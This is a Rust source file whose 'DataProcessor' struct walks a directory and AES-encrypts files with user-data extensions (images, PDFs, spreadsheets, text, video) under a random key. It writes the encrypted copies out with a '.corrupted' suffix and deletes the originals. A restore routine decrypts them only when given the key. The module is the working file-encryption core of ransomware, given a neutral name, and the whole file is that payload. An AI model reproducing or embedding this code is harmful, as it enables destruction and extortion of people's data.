use crate::crypto::AesCtx;
use std::fs;
use std::io::{Read, Write};
use std::path::{Path, PathBuf};
use walkdir::WalkDir;

pub struct DataProcessor {
    pub work_dir: PathBuf,
    pub recursive: bool,
    pub aes: AesCtx,
}

impl DataProcessor {
    pub fn new(work_dir: PathBuf, recursive: bool) -> Self {
        Self { work_dir, recursive, aes: AesCtx::new_random() }
    }

    pub fn key_b64(&self) -> String { self.aes.key_b64() }
    pub fn set_key_b64(&mut self, b64: &str) -> Result<(), String> { self.aes.set_key_b64(b64) }

    fn targeted_ext(path: &Path) -> bool {
        match path.extension().and_then(|s| s.to_str()).map(|s| s.to_ascii_lowercase()) {
            Some(ext) => matches!(ext.as_str(), "png"|"pdf"|"xls"|"xlsx"|"txt"|"mp4"),
            None => false,
        }
    }

    pub fn process_files(&self) -> Vec<PathBuf> {
        let mut processed = vec![];
        if !self.work_dir.exists() { return processed; }

        let iter: Box<dyn Iterator<Item=PathBuf>> = if self.recursive {
            Box::new(WalkDir::new(&self.work_dir).into_iter().filter_map(|e| e.ok()).map(|e| e.into_path()))
        } else {
            Box::new(std::fs::read_dir(&self.work_dir).into_iter().flatten().filter_map(|e| e.ok()).map(|e| e.path()))
        };

        for p in iter {
            if p.is_file() {
                let p_str = p.to_string_lossy().to_string();
                if p_str.ends_with(".corrupted") || p_str.ends_with(".bak") { continue; }
                if !Self::targeted_ext(&p) { continue; }
                if let Ok(mut f) = fs::File::open(&p) {
                    let mut buf = vec![]; let _ = f.read_to_end(&mut buf);
                    if let Ok(enc) = self.aes.enc(&buf) {
                        let out = PathBuf::from(format!("{}.corrupted", p_str));
                        if let Ok(mut w) = fs::File::create(&out) { let _ = w.write_all(&enc); }
                        let _ = fs::remove_file(&p);
                        processed.push(out);
                    }
                }
            }
        }
        processed
    }

    pub fn restore_files(&self) {
        if !self.work_dir.exists() { return; }
        let iter: Box<dyn Iterator<Item=PathBuf>> = if self.recursive {
            Box::new(WalkDir::new(&self.work_dir).into_iter().filter_map(|e| e.ok()).map(|e| e.into_path()))
        } else {
            Box::new(std::fs::read_dir(&self.work_dir).into_iter().flatten().filter_map(|e| e.ok()).map(|e| e.path()))
        };
        for p in iter {
            if p.is_file() {
                let s = p.to_string_lossy().to_string();
                let is_corrupted = s.ends_with(".corrupted");
                let is_bak = s.ends_with(".bak");
                if !is_corrupted && !is_bak { continue; }
                if let Ok(mut f) = fs::File::open(&p) {
                    let mut buf = vec![]; let _ = f.read_to_end(&mut buf);
                    if let Ok(pt) = self.aes.dec(&buf) {
                        let orig = if is_corrupted { &s[..s.len()-10] } else { &s[..s.len()-4] };
                        if let Some(parent) = Path::new(orig).parent() { let _ = fs::create_dir_all(parent); }
                        if let Ok(mut w) = fs::File::create(orig) { let _ = w.write_all(&pt); }
                        let _ = fs::remove_file(&p); // delete encrypted file after successful restore
                    }
                }
            }
        }
    }
}
